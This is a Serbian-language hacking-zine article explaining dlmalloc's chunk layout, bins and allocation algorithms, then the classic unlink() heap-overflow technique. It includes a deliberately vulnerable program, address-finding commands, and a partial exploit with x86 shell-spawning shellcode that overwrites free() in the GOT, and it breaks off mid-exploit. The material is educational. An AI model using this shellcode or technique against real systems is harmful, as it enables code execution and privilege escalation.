@@ -1,0 +1,634 @@
+                              ...................
+                        ...::: phearless zine #4 :::...
+
+....................>---[ Malloc Demistified - Part 1. ]---<...................
+
+...........................>---[ by Wintermuth ]---<...........................
+                                                    wintermuth[at]gmail[dot]com
+
+ 1. Uvod
+ 2. Doug Lea`s Malloc
+       Alociranje memorije
+       Binovi 
+       Doubly-linked lista
+       unlink()
+       frontlink()
+       malloc(3) algoritam 
+       free(3) algoritam 
+       realloc(3) algoritam 
+ 3. Eksploitacija - unlink() tehnika 
+ 4. Odvod
+ 
+///////////////////////////////////////////////////////////////////////////
+--==<[ 1. Uvod
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+      
+      U poslednje vreme je izaslo par tekstova sa jako lepim idejama vezanim za 
+eksploataciju. Medju njima i jeadan vezan za heap eksploataciju na linuxu sto mi
+dade ideju da napisem jedan tekst i eksploataciji heapa na linuxu. Kako je 
+default linux alokator memorije Doug Lea`s  malloc ili ti dlmalloc ovaj tekst ce
+opisivati njegove principe. Pocevsi od samih algoritama za alociranje memorije 
+(koji su za razumevanje eksploatacije heapa jako bitni) do starih i novih 
+tehnka eksploatacije. U ovom tekstu necete naci nista potpuno novo i do sada 
+nevidjeno. Nisam izmisljao toplu vodu. Neko ce reci da je ovo i cist prevod 
+vec postojecih tekstova, ali nije bas tako. Pokusao sam da na srpskom, prostijim
+recima predtavim tehnike koje su tim velikim ljudima pale na pamet. 
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 2. Doug Lea`s Malloc
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+      Dakle GNU C library koristi dlmalloc alokator memorije. Funkcije koje to 
+omogucavaju su malloc(), realloc(), calloc() i free(). Iako ce one biti opisane 
+mozete procitati njihove man stranice. malloc() prima kao argument broj bajtova 
+koje treba da alocira, a kao rezultat vraca pointer na alociranu memoriju. 
+realloc() prima kao argumente pointer na vec alociranu memoriju i menja njenu 
+velicinu u broj bajtova zadan kao drugi parametar. calloc() prima kao prvi 
+argument broj elemenata niza, a kao drugi velicinu svakog elementa tog niza. 
+kao rezultat vraca pointer na alociranu memoriju velicine duzine elemenata puta
+broj elemenata. Memorija je prethodno ociscena. I free(), jasno, oslobadja 
+memoriju na zadatoj adresi. 
+
+      Kako kaze na samoj stranici koja opisuje dlmalloc
+      http://gee.cs.oswego.edu/dl/html/malloc.html
+
+      Doug Lea`s malloc nije najbrzi , niti najstedljiviji po pitanju memorije ili
+najportabilniji , ali najbolje kombinuje ove tri odlike. 
+
+
+      Bitna stvar kod chunkova kojima upravlja dlmalloc je sto oni pri sebi sadrze
+informacije i o prethodnom i o narednom chunku. Ova bitna osobina, koja je 
+kljucna pri alociranju memorije i koja omogucava na primer spajanje dva susedna 
+chunka ako su neiskorisceni, predstavlja svu divotu i lepotu malloc 
+eksploatacije. Naime ako je napadac u stanju da kontrlise te podatke lako moze 
+da prvari dlmalloc i  da izvrsi svoj shellcode ili sta vec. O tehnikama 
+iskoriscavanja ovoga kasnije. A sada o samom funkcionisanju alokatora.
+
+      U dlmalloc alokatoru dostupni chunkovi se nalaze u binovima poredjani po 
+velicini. Pretraga za odgovarajucim chunkom se vrsi od najmanjeg chunka kod se 
+ne dodje do best-fit chunka, odnosno onog koji je najpriblizniji vrednosti 
+koja se trazi.
+
+      Postoji i poseban chunk koji se naziva wilderness chunk. To je poslednji 
+chunk koji se nalazi na granici adresa koje je sistem alocirao. Kao takav, 
+predstavlja jedini koji moze da se poveca. Iako moze biti iste velicine kao i 
+bilo koji drugi chunk algoritmi za alokaciju ga smatraju vecim od ostalih zato
+sto moze da se poveca sve do granica normale. Tako da on uvek ostaje 
+neiskoriscen. Sa napadaceve tacke gledista , wilderness chunk predstavlja veoma 
+tezak problem. dlmalloc posebno upravlja ovim chunkom i korumpiraje njegovih 
+delova je jako otezano. 
+
+      Velicina alocirane memorije od strane alokatora nikada nije jednaka 
+zahtevanoj velicini. Do ovoga dolazi zbog toga sto svaki chunk sadrzi 
+informacije o prethodnom, a i zbog toga sto je velicina scakog chunka jednaka 
+nekom broju puta 8. Kada se da zahtev za alociranjem memorije velicine 0 bajtova
+alokator u stvari alocira 16 bajta. To je minimum koji moze da se alocira.
+
+            
+
+      Kakve su to informaciju u svakom chunku? E, sad dolazimo do bitnih stvari za
+samu eksploataciju. 
+
+      #define INTERNAL_SIZE_T size_t
+
+      struct malloc_chunk {
+      INTERNAL_SIZE_T prev_size;
+      INTERNAL_SIZE_T size;
+      struct malloc_chunk * fd;
+      struct malloc_chunk * bk;
+            };
+
+            Alocirani chunk izgleda otprilike ovako:
+
+    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: velicina prethodnog chunka, dlmalloc ovo     |
+             | koristi samo ako je prethodni chunk slobodan            |
+             +---------------------------------------------------------+
+             | size: velicina chunka, razlika izmedju chunk i          |
+             | nextchunk i jos dva bita statusnih informacija          |
+      mem -> +---------------------------------------------------------+
+             | fd: dlmalloc ga trenutno ne koristi jer je chunk        |
+             | alociran - sama memorija koja se korisitpocinje ovde    |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             | bk: dlmalloc ga trenutno ne koristi jer je chunk        |
+             | alociran                                                |
+             + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
+             | sami podaci                                             |
+nextchunk -> + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
+             | prev_size: velicina prethodnog , posto je on alociran   |
+             | dlmalloc ga ne koristi                                  |
+             +---------------------------------------------------------+
+
+
+      Kada se alocira memorija (putem malloc() ili realloc()) vraca se pointer na 
+mem. Da bi se dobio pointer na mem od pocetka chunka koriste se funkcije 
+chunk2mem(), a za obrnuto mem2chunk()(logicno zar ne:)). To si izvodi prilicno 
+prosto, jednostano se dodaju ili oduzmu 8 bajta. Velicina prev_size i size 
+hedera je po 4 bajta pa je samim tim i prostor koji odvaja pocetak chunka od 
+pocetka memorije 8 bajta.
+
+
+
+      Slobodni chunkovi se nalaze doubly-linked listi i izgledaju ovako:
+
+    chunk -> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: posto je chunk slobodan koze se korisiti     |
+             | za smestanje podataka iz prethodnog                     |
+             +---------------------------------------------------------+
+             | size: velicina chunka  i jos dva bajta inforamcija o    |
+             | statusu                                                 |
+             +---------------------------------------------------------+
+             | fd: forward pointer, pokazivac na sledeci chunk u listi |
+             | ne na sledeci fizicki chunk                             |
+             +---------------------------------------------------------+
+             | bk: back pointer, pokazivac na prethodni chunk u listi  |
+             | ne na fizicki prethodni chunk                           |
+             +---------------------------------------------------------+
+             |  slobodan prostor                                       |
+sledeci chunk+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+             | prev_size: velicina prethodnog chunka jer je slobodan   |
+             +---------------------------------------------------------+ 
+
+    Alociranje memorije:
+
+      Korisnik zahteva odredjen broj bajtova i dobija pointer na njih. Kako?
+
+      Kada dobije zahtev za alociranje, dlmalloc prvo poziva request2size() 
+funkciju koja zahtevanu velicinu prebacuje u onu koju dlmalloc koristi. To zbog 
+gore pomenutih hedera, cija je ukupna velicina 8 i zbog toga sto, kao sto sam 
+vec rekao, svaka velcina koju alocira dlmalloc jednaka nekom broju puta 8. Zato 
+sto sto se prev_size heder sledeceg chunka moze koristiti za smestanje podataka 
+(ako je prethodni chunk alociran nema potrebe za inforamcijama o njegovoj 
+velicini) od ukupnog rezultata se oduzima 4. To izgleda ovako: 
+
+#define request2size(req, nb) \
+ ((nb = (req) + (SIZE_SZ + MALLOC_ALIGN_MASK)),\
+  ((long)nb <= 0 || nb < (INTERNAL_SIZE_T) (req) \
+   ? (__set_errno (ENOMEM), 1) \
+   : ((nb < (MINSIZE + MALLOC_ALIGN_MASK) \
+           ? (nb = MINSIZE) : (nb &= ~MALLOC_ALIGN_MASK)), 0)))
+
+
+      Vec sam napomenuo za sta sluzi prev_size heder. size heder sadrzi 
+informacije o velicini i dva bita statusnih informacija. Otkud ta dva bita?
+Posto je velicina svakog chunka jednaka nekom broju puta 8, 3 LSB (Least 
+Significant Bit) ce uvek biti 0. Da nebi stojali bezveze , dva se koriste 
+za statusne informacije, a treci ostaje neiskoriscen. Prvi LSB bit predstavlja 
+PREV_INUSE informaciju, a drugi LSB bit IS_MMAPED informaciju. Ako je PREV_INUSE
+bit postavljen on oznacava da je prethodni fizicki chunk zauzet i da prev_size 
+heder moze da sadrzi korisnicke podatke. Ako PREV_INUSE bit nije postavljen 
+to znaci da prethodni fizicki chunk nije u upotrebi i da prev_size heder sadrzi 
+informacije o njemu koje koristi dlmalloc. Akoje IS_MMAPED bit postavljen to 
+znaci da je chunk alociran koristeci sistemske mmap mehanizme. 
+
+      Binovi 
+
+
+      Slobodni chunkovi su organizovani u binove i to po velicini. Postoji 128 
+binova razlicite velicine. Prvih 62 bina se nazivaju malim binovima. Binovi su 
+organizovani po svojim indeksima. dlmalloc sve chunkove manje od 512 bajta 
+smatra malim binovima. U binovima se nalaze chunkovi iste velicine. Kako je 
+najmanja velicina chunka 16 bajta. Prvi bin sadrzi chunkove od 16 bajta. Kako su
+velicine chunkova jednake nekom broju puta 8, sledeci bin sadrzi chunkove od 24 
+bajta, bin ciji je index 3 sadrzi chunkove od 32 bajta i tako dalje. Samim tim 
+bin s indeksom 62 sadrzi chunkove velicine 504 bajta. Lako se moze izracunati 
+koji indeks ima bin kojem pripada chunk. 
+
+
+      Doubly-linked lista
+
+
+      Slobodni chunkovi su oraganizovani u doubly-linked listama. Postoji po jedna 
+doubly linked lista po binu. Na pocetku su ove liste prazne posto je ceo heap
+samo jedan veliki neiskorisceni chunk, wilderness chunk. Bin nije nista drugo do 
+par pointera koji sluzi doubly-linked listama. Postoje forward pointer i back
+pointer. Forward pointer bina pokazuje na prvi (najveci) chunk u listi. 
+Forward pointer tog chunka pokazuje na sledeci chunk, ovaj na sledeci, sve dok 
+poslednji chunk ne pokaze ponovo na bin. Back pointer pokazuje na poslednji 
+chunk u listi, back pointer tog chunka pokazuje na onaj ispred njega i tako 
+redom sve dok prvi chunk ne pokaze na sam bin, ako je lista prazna back pointer 
+bina pokazuje na sam bin.
+
+      unlink()
+
+      Da bi dlmalloc sklonio neki chunk sa njegove doubly-linked liste, mora da 
+zameni back pointer sledeceg chunka sa adresom chunka prethodnom onome koji hoce
+da skine sa doubly linked liste. Isto tako mora i forward pointer prethodnog 
+da zameni adresom sledeceg.dlmalloc ovo radi putem unlink() makroa :
+
+#define unlink( P, BK, FD ) {            \
+    BK = P->bk;                          \
+    FD = P->fd;                          \
+    FD->bk = BK;                         \
+    BK->fd = FD;                         \
+}
+
+      Upravo unlink() makro je esencijalan za jednu od metoda eksploatacije.
+
+
+      frontlink()
+
+      Da bi se oslobodjeni chunk "ubacio" u odgovarajuci bin a samim tim i u 
+odgovarajucu doubly-linked listu poziva se frontlink() makro. On prvo odredjuje
+odgovarajuci bin u koji treba da se smesti chunkk izracunavajuci njegov indeks 
+kao sto je vec opisano ( za to poziva smallbin_index() ili bin_index() u 
+zavisnosti  da li je rec o malom chunku ili o vecem). Zatim se poziva bin_at()
+da bi se odredila adresa bina u memoriji i na kraju se napokon chunk stavlja na 
+pravo mesto u doubly-linked listi tog bina. Ovo je  FIFO organozovana 
+struktura podataka i stoga chunk odlazi na pocetak, a chunkovi za koriscenje se 
+uzimaju s kraja.
+
+      Ovako izgleda frontlink() :
+
+#define frontlink( A, P, S, IDX, BK, FD ) {            \
+    if ( S < MAX_SMALLBIN_SIZE ) {                     \ // ako je rec o malom 
+        IDX = smallbin_index( S );                     \ // bin  poziva 
+        mark_binblock( A, IDX );                       \ // smallbin_index()
+        BK = bin_at( A, IDX );                         \
+        FD = BK->fd;                                   \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+    } else {                                           \ // ako je rec o vecem 
+        IDX = bin_index( S );                          \ // binu poziva 
+        BK = bin_at( A, IDX );                         \ // bin_index()
+        FD = BK->fd;                                   \
+        if ( FD == BK ) {                              \
+            mark_binblock(A, IDX);                     \
+        } else {                                       \
+            while ( FD != BK && S < chunksize(FD) ) {  \
+                FD = FD->fd;                           \
+            }                                          \
+            BK = FD->bk;                               \
+        }                                              \
+        P->bk = BK;                                    \
+        P->fd = FD;                                    \
+        FD->bk = BK->fd = P;                           \
+    }                                                  \
+}
+
+
+ P je chunk velicine S , IDX je index odgovarajuceg bina, BK back pointer 
+i FD forward pointer.
+
+
+      malloc(3) algoritam 
+
+      
+      malloc(3) je u GNU C libraryu oznacen kao __libc_malloc() a u samom malloc.c
+kao mALLOc(). Pri pozivanju ove funkcije, prvo se zahtev za memorijom od strane
+programa prebacuje u formu koja moze da se koristi putem prethodno opisanog 
+request2size(). Zatim se to prosledjuje chunk_alloc() koja iam dve opcije:
+      
+      Prva opcija:
+      
+      Da najde bin odgovaraujce velicine i ako je u njemu nadjen chunk 
+odgovarajuce velicine on biva izauzet. dlmalloc smatra da je chunk odgovarajuce 
+velicine ako je razlika izmedju njegove velicine i velicine zahteva veca ili 
+jednaka 0 ali manja od MINSIZE. Ako je njegova velicina manja od zahteva, chunk 
+bi bio premali, ako je razlika 0 chunk bi bio odgovarajuc. Sve vece vrednosti bi
+bile odgovarajuce dok god ta razlika nije MINSIZE ili 16, jer bi onda dlmalloc 
+mogao da formira novi chunk ali to prva opcija ne omogucava.
+      Zahtevi za alociranjem malih chunkova se procesiraju na dva nacina. Zahtev 
+se smatra zahtevom za mali chunk ako je index odgovarajuceg bina i index 
+sledeceg bina mali.Ako doubly-linked lista bina nije prazna uzima se poslednjim 
+chunk iz nje. 
+      Ako je doubly-linked lista odgovarajuceg chunka prazna uzima se poslednji 
+chunk iz doubly-linked liste sledeceg bina ( razlika izmedju zahteva i velicine 
+chunka je idalje manja od MINSIZE jer je onda samo 8 a ne 16). Ako je nadjen 
+odgovarajuci chunk poziva ze unlink() makro da bi ga izbacio iz njegove 
+doubly-linked liste i njegova adresa se vraca mALLOc()-u. On se nalazi tako sto 
+chunk_alloc() skenira doubly-linked listu tog bina pocevsi od najmanjeg chunka i 
+prateci nejgov back pointer ka vecim chunkovima. Ako se tokom skeniranja naidje 
+na chunk koji je izuvise veliki u odnosu na zahtev, skeniranje se prekida jer bi
+svaki sledeci shunk bio jos veci. Ako se tokom skeniranja naidje na chunk koji 
+je upravo odgovarajuce velicine unlink() se poziva. Ako se tokom skeniranja ne 
+naidje na odgovarajuci chunk koristi se druga opcija.
+
+      Druga opcija:
+
+      Ako prva opcija nije uspela koristi se najnoviji remaindered chunk. On ne 
+mora uvek da postoji. dlmalloc daje specijalno znacenje tom chunku sa 
+link_last_remainder(), a sklanja ga sa clear_last_remainder(). Ako je neki od 
+chunkova oznacen sa last_remainder on biva podeljen ako je njegova velicina 
+dovoljno velika, ako je razlika izmedju njegove velicine i velicine zahteva 
+veca ili jednaka MINSIZE. Prvi deo, koji je velicine zahteva, biva vracen 
+mALLOc(), a drugi deo postaje novi last_remainder. Ali ako on nije dovoljno 
+veliki, ako je razlika izmedju njegove velicine i velicine zahteva manja od 
+MINSIZE, poziva se clear_last_reminder(). Mogucnosti su da chunk_alloc() 
+vrati taj chunk koji je upravo oslobodio oznake last_remainder mALLOc()u ako je 
+razlika njegove velicine i velicine zahteva jednaka ili veca od 0 ili ga 
+stavlja u odgovarajucu doubly-linked listu (ako je razlika izmedju njegove 
+velicine i velicine zahteva manja od nule). Ako idalje nema odgovarajuceg chunka
+prelazi se na skeniranje sledeceg bina. Skeniranje se nastavlja pocevsi od 
+najmanjeg chunka u doubly-linked listi tog bina pratici njegove back pointere 
+sve dok se ne nadje chunk koji je veci od velicine zahteva. Taj chunk biva 
+podeljen na dva dela (ako je razlika izmedju njegove velicine i velicine 
+zahteva veca ili jednaka MINSIZE). Prvi deo se pomocu unlink() sklanja iz 
+njegove doubly-linked liste i vraca mALLOc() funkciji kao odgovarajuci chunk, 
+drugi deo postaje novi last_reminder pomocu link_last_remainder(). Ako je nadjen
+chunk upravo odgovarajuce velicine (razlika njegove velicine i velicine zahteva 
+je jednaka ili veca od nule ali manja od MINSIZE) on biva skinut sa svoje 
+doubly-linked liste i prosledjen mALLOc() funkciji. 
+      Ako pak nijedan od gornjih uslova nije ispunjen prelazi se na sledece:
+Wilderness chunk biva procesiran. Ako je dovoljno veliki ( ako je razlika 
+izmedju njegove velicine i velicine zahteva veca ili jednaka MINSIZE) biva 
+podeljen na dva dela. Prvi deo se vraca mALLOc() funkciji, a drugi postaje novi
+wilderness chuk. Ako nije dovoljno veliki, a ako se zahtev podudara sa mmap 
+thresholdom, a sistem podrzava mmap (linux ga podrzava) memorija se alocira 
+putem mmap() poziva. Kako je mmap threshold prilicno veliki ( mmap threshold 
+mozete kontrolisati putem MALLOC_MMAP_THRESHOLD_ environment varijable sem  
+u slucaju SUID programa kada ova varijabla ne moze da zaobidje defaultnu 
+vrednost od 128k) nece uvek doci do alociranja putem mmap() poziva. U slucaju da
+mmap threshold nije dostignut granice koje je sistem ranije postavio se 
+povecavaju koriscenjem sbrk() poziva. Samim time wilderness chunk biva povecan 
+i zatim opet podeljen kao u slucaju da je dovoljno veliki. Ako prosirenje ne 
+uspe mALLOc() funkciji se vraca NULL pointer sto indicira gresku.
+
+      free(3) algoritam 
+
+
+      free(3) je u GNU C librariju predstavljen kao __libc_free() a u samom 
+malloc.c fajuli kao fREe() funkcija. Po pozivanju, funkcija prvo utvrdjuje da 
+li je chunk koji treba da oslobodi alociran pomocu mmap sistemskog mehanizma.
+To utvrdjuje pomocu chunk_mmaped() makora i onog IS_MMAPED bita iz hedera 
+chunka. Ako jeste, oslobadja chunk pomocu munmap() funkcije (prosledjuje pointer 
+munmap_chunk()),a ako nije oslobadja ga putem free_chunk() koji je nama bitniji.
+Ako se chunk koji treba da se oslobodi granici sa wilderness chunkom, ta dva 
+bivaju spojena i formira se novi veci wilderness chunk. Ako se ne granici sa 
+wilderness chunkom desava se da se prethodni chunk i onaj koji se oslobadja 
+spajaju.Takodje, chunk koji se oslobadja se spaja sa sledecim ako ovaj nije 
+zauzet. Oba chunka, i prethodni i sledeci, bivaju skinuti sa sovjih 
+doubly-linked listi i formira se novi chunk koji se smesta u odgovarajuci bin.
+Ako je prethoni chunk bio obelezen sa last_remainder novi koji nastaje spajanjem
+ova dva postaje takodje last remainder. Informacije o last remainderu se menjaju
+samo kada se njegov pocetak promeni. Znaci da se link_last_remainder()  poziva 
+samo kada je adresa pocetka starog last remaindera razlicita od adrese novog 
+last remaindera. 
+
+
+      realloc(3) algoritam 
+
+      realloc(3) je u GNU C libraryu predstavljen kao __libc_free(), a u samom 
+malloc.c fajlu kao rEALLOc(). Ako se realloc() funkcija poove sa argumentom za 
+velicinu jednakom nuli realocirace se memorija velicine MINSIZE, osim ako je 
+REALLOC_ZERO_BYTES_FREES postavljen, ako jeste postavljen, poziva se free() 
+funkcija i memorija se oslobadja. Ako se pozove sa pointer argumentom jednakom 
+nuli realloc() se smatra istim kao malloc(). Ako se realloc() pozove sa 
+vrednostima koje odgovaraju, pointer vrednost kao pokazivac na vec alocirani 
+chunk, a size argument nova vrednost memorije dolazi do sledecih koraka. Prvo se 
+utvrdjuje da li je chunk alociran pomocu mmap mehanizma sa chunk_is_mmaped(), 
+ako nije prelazi se na funkciju chunk_realloc. Postoje dve mogucnosti zahteva.
+Da je zahtev za smanjenjem alocirane memorije i za povecanjem alocirane 
+memorije. Ako se zahteva smanjenje memorije uporedjuju se velicine prethodno 
+alociranog chunka i novog zahteva. Naravno , prvo se zahtev preda funkciji za 
+prebacivanje u odgovarajuci oblik ( request2size()). Ako je razlika izmedju 
+prethodno alociranog chunka i novog zahteva veca ili jednaka MINSIZE chunk 
+jednostavno biva podeljen. Njegov prvi deo, koji je velicine zahteva, biva 
+alociran, a drugi deo oslobodjen putem free(). Ako je razlika izmedju prethodno 
+alociranog chunka i zahteva manja od MINSIZE, chunk se ne dira, jednostavno biva
+vracen rEALLOc() funkciji.
+      Kod zahteva za prosirenjem memorije moze doci do nekoliko stvari. Ako je 
+sledeci chunk posle prethodno alociranog chunka slobodan postoje dve opcije. Ako 
+je taj sledeci chunk ujedno i wilderness chunk i ako je njegova velicina plus 
+velicina chunka koji se realocira MINSIZE ili vise bajta veca od zahtva, 
+wilderness chunk biva podeljen na dva dela. Prvi deo se spaja sa chunkom koji se
+realocira i pointer na njega se vraca rALLOc() funkciji, a drugi deo postaje 
+novi wilderness chunk. Ako je pak chunk koji se nalazi posle chunka koji se 
+realocira obican chunk biva sledece. Ako je velicina chunka koji se realocira 
+zajedno sa velicinom sledeceg i prethodnog chunka veca ili jednaka sa  velicinom
+zahteva, ta tri chunka se spajaju, sadrzaj realociranog chunka se kopira u novi 
+chunk, a taj novonastali chunk se procesirao kao u slucaju zahteva za smanjenjem
+alocirane memorije.
+      Ako je velicina prethodnog chunka i onog koji biva alociran veca ili jednaka
+velicini zahteva, ova dva chunka bivaju spojena, a taj prethodni biva skinut sa 
+svoje doubly-linked liste pomocu unlink().
+      Ako ne moze da se realocira sa chunkom dovoljno velike velicine oziva se 
+vec objasnjena funkcija chunk_alloc() koja alocira novi chunk. Ako se taj 
+novoalocirani chunk nalazi odmah ispred chunka koji je bio realociran ( do toga
+moze da dodje samo ako taj sledeci chunk nije bio dovoljno veliki, ali da je 
+nekako prosiren, posto je jedini chunk koji moze da se prosiri wilderness chunk 
+to znaci da je sledeci chunk bio wilderness chunk) njih dvoje bivaju spojeni i 
+dalje se procesiraju kao u slucaju zahteva za smanjenje memorije. Ako to nije 
+sledeci chunk, sadrzaj realociranog chunka se prebacuje u novoalocirani chunk
+a sam chunk koji se alocira biva oslobodjen pomocu fREe(). Napokon, pointer 
+ka tom novoalociranom chunku se vraca rEALLOc() funkciji.
+
+///////////////////////////////////////////////////////////////////////////
+--==<[ 3. Eksploitacija - unlink() tehnika 
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+
+      Kao sto je vec objasnjeno, unlink() sluzi za "vadjenje" chunka iz njegove 
+doubly-linked tabele. Sta se tu desava detaljnije? Recimo da program moze da u 
+alocirani bafer smesti nekontrolisano velike podatke, tacnije, on ne moze da ih 
+smesti vec ih smesta i iza te alocirane memorije kao u slucaju obicnog buffer 
+overflowa. Dakle ako je u mogucnosti da pise van granica alocirane memorije,
+odnostno alociranog chunka, napadac moze da prepise neke vitalne podatke 
+sledeceg chunka u memoriji i, ako bi naveo dlmalloc da procesira taj sledeci 
+chunk nekako, navede program da izvrsi maliciozni kod ili ti shellcode. U tome 
+lezi sva divota eksploitacije dlmalloc alokatora memorije:). Recimo da napadac 
+moze da prepise vrednost FD pointera adresom neke funkcije - 12 bajta (tih 12 
+bajtova  cine offset na kojoj se udaljenosti nalazi BK pointer unutar hedera 
+chunka), a zatim sadrzaj BK pointera prepise adresom shellcodea, posle 
+procesiranja tog korumpiranog chunka bi unlink() prepisao adresu funkcije 
+adresom shellcodea koji bi se izvrsio po pozivanju te funkcije. Klasican 
+scenario bi bio da se u  FD pointeru nalazi adresa neke funkcije u GOT tabeli 
+koja se u daljem radu programa poziva, a u BK pointeru adresa samog shellcodea.
+Ali stvari nisu bas toliko proste, mada ni bas mnogo komplikovanije:) Naime, 
+unlink() ce u sred niza na koji pokazuje BK upisati FD pointer koji nam kvari 
+nas shellcode i sve odlazi do djavola i nema mu spasa. Dobro, ne placite jos, 
+nije sve bas tako crno, sve sto treba da uradite jeste da kao prvu instrukciju 
+shellcodea stavite jedan jump koji bi skocio iza tog upisanog FD pointera na 
+regularni shellcode i dalje sve tece kao podmazano. Kako unlink() taj FD pointer
+upisuje na adresi na koju pokazuje BK pointer + 8 (8 je offset na kojem se 
+nalazi FD pointer unutar hedera chunka) bajta zna se koliko treba preskociti.
+      Kako bih demonstrirao ovu tehniku koristicu vec postojece primere iz 
+teksta iz phracka posto ne zelimd a izmisljam toplu vodu, a i oni su sasvim 
+jasni. Sledi ranjivi program: 
+
+int main( int argc, char * argv[] )
+{
+    char * first, * second;
+
+ first = malloc( 666 );
+ second = malloc( 12 );
+ strcpy( first, argv[1] );
+ free( first );
+ free( second );
+}
+
+      Sta se desava pri pokretanju programa? Program alocira dva bafera. Jedan 
+velicine 666 bajta, a drugi velicine 12 bajta. Zatim se u prvi bafer kopira 
+parametar zadan na komandnoj liniji (ko je upopznat sa eksploitacijom obicnih 
+stack overflowova odmah uocava ranjiovst) za ociglednim nedostatkom provere 
+da li argv[1] moze da stane u bafer. Zatim se oslobadja prvi alocirani bafer 
+a odmah za njim i drugi. 
+      Samim tim sto ne proverava duzinu, program je ranjiv. Napadac moze da pise 
+van granica prvog bafera i napravi stetu. Posto je odmah iza prvog bafera 
+alociran drugi, napadac moze da kontrolise sadrzaj njegovih hedera ukljucujuci 
+PREV_INUSE bit na primer, PREV_SIZE, i narabvno FD i BK pointere! E posto je vec 
+receno da je velicina svakog alociranog bafera jednaka nekom broju puta 8 
+sam alocirani bafer nije velicine 666 bajta vec request2size(666) sto rezultuje 
+sa 672 alocirana bajta. Kako neki deo tog alociranog prostora spada u hedere 
+efektivna velicina bafera je request2size(666) - 4  a to je jednako 668.
+      Znaci, da bi kontrolisao vrednosti sledeceg chunka, napadac mora kao prvi 
+argument  programu da prosledi argument duzine vise od668+12 bajta. E sad glavna
+fora je navesti unlink() da procesira taj korumpirani chunk. Pri pozivanju 
+free() funkcije on bi se procesirao u slucaju da je slobodan kako bi se 
+formirala odgovarajuca doubly-linked tabela. Ali on nije slobodan. E sad, setite
+se kako dlmalloc utvrdjuje da li je chunk slobodan. On to radi tkao sto vidi 
+PREV_INUSE bit sledeceg chunka i ako je on postavljen smatra taj chunk zauzetim.
+A kako dolazi do PREV_INUSE bita sledeceg chunka? Koristi size deo tog chunka 
+da bi izracunao adresu sledeceg chunka. Kako napadac kontrolise informacije o 
+tom chunku on je u mogucnosti da prevari dlmalloc da smatra taj chunk slobodnim.
+Na primer, ako napadac u size polje upise vrednost od -4, kada dodje do 
+izracunavanja dlmalloc ce izracunati da je pocetak sledeceg chunka 4 bajta 
+ispred pocetka korunpiranog chunka. Zbog toga ce umesto da procita size polje 
+sledeceg chunka procitati PREV_SIZE korumpiranog chunka. Napdac moze da upise, 
+dakle, broj po sovjoj zelji i navesti malloc da procita PREV_INUSE bit nekog 
+drugog chunka, zbog toga smatrati korumpirani chunk slobodnim i procesirati ga 
+sa unlink() sto dalje dovodi do izvrsenja shellcodea.
+      Kad vec koristim primer ranjivog programa koristicu i exploit, opet da nebih
+izmisljao toplu vodu:) Exploit iz phracka prepisuje FD pointer adresom free() 
+funkcije u GOT tabeli - 12 bajta i BK pointer adresom shellcodea koji se nalazi 
+8 bajta od pocetka prvog chunka. Dakle za exploitaciju su nam protrebne dve 
+informacije. Adresa alociranog prvog bafera i adresa free() funkcije u GOT. 
+      Autor teksta u phracku koristi ltrace za pronalazenje adrese bafera. Ja 
+trenutno nemam ltrace pa cu stoga dodati u ranjivi program jednu liniju koja ce 
+mi pomoci. Sada ranjivi program izgleda ovako:
+
+int main( int argc, char * argv[] )
+{
+    char *first, *second;
+
+ first = malloc( 666 );       // alociran prvi bafer
+ second = malloc( 12 );       // alociran drugi bafer
+ printf("0x%x\n",first);      // stampa adresu prvog bafera
+ strcpy( first, argv[1] );  // ranjivi deo
+ free( first );                     // oslobadja prvi
+ free( second );              // oslobadja drugi
+}
+
+      Pri pokretanju: 
+      
+earthquake@ono-sendai:~$ gcc vuln.c  -o vuln
+vuln.c: In function `main':
+vuln.c:5: warning: assignment makes pointer from integer without a cast
+vuln.c:6: warning: assignment makes pointer from integer without a cast
+bash-2.05b$ ./vuln asd
+0x80496d0 <--------nama potrebna adresa bafera 
+earthquake@ono-sendai:~$
+
+      Za pronalazenje adrese free() funkcije u GOT moze se koristiti objdump:
+
+earthquake@ono-sendai:~$ objdump -R ./vuln | grep free
+08049670 R_386_JUMP_SLOT   free
+earthquake@ono-sendai:~$ 
+
+      Dakle, trazena adresa je 0x08049670. GOT adrese se nalaze u otprilike 
+odredjenom rasponu sto pri remote exploitima moze da se koristi za brute force 
+utvrdjivanje adrese. 
+       I sam exploit: 
+
+#include <string.h>
+#include <unistd.h>
+
+#define FUNCTION_POINTER ( 0x08049670 ) //adresa free() u GOT
+#define CODE_ADDRESS ( 0x080496d0 + 2*4 ) // adresa bafera + 8 
+
+#define VULNERABLE "./vuln" // ocigledno :)
+#define DUMMY 0xdeadc0de // djubre
+#define PREV_INUSE 0x1 
+
+char shellcode[] =
+        /* the jump instruction */
+        "\xeb\x0appssssffff"
+        /* E bas da ne koristim Aleph Oneov shellcode :)))*/
+            /* Cr4zy l33t h3llc0d3z !!!!*/
+      "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80"
+            "\x31\xc0\x50\x68\x2f\x2f\x6c\x73\x68\x2f"
+            "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+            "\xd2\xb0\x0b\xcd\x80";
+
+int main( void )
+{
+        char * p;
+        char argv1[ 680 + 1 ];
+        char * argv[] = { VULNERABLE, argv1, NULL };
+
+        p = argv1;
+        /*  fd prvog chunka */
+        *( (void **)p ) = (void *)( DUMMY );
+        p += 4;
+        /*  bk prvog chunka */
+        *( (void **)p ) = (void *)( DUMMY );
+        p += 4;
